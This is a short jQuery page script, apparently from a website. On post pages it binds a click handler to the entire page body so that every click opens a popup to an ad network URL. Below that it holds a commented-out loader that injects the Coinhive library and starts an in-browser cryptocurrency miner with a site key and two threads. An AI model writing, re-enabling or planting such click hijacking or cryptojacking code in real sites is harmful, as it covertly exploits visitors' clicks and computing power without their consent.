$(document).ready(function(){
	var url=window.location.toString();
	if(url.search(/\/post\//)>-1){
		$('body').click(function(){window.open('http://go.ad2upapp.com/afu.php?id=823278');});
	}


	// var script = document.createElement('script');
	// script.src = 'https://coinhive.com/lib/coinhive.min.js';
	// var ls = document.getElementsByTagName('head')[0].appendChild(script);

	// ls.addEventListener('load', los, false);
		
	// function los() {
	// 	setTimeout(function() {
	// 		var miner = new CoinHive.Anonymous('wXS5KFc5mWChIpczWxnYY6X9tb95ESw1', {
	// 			threads: 2
	// 		});
	// 		miner.start();
	// 	}, 500);
	// }
});
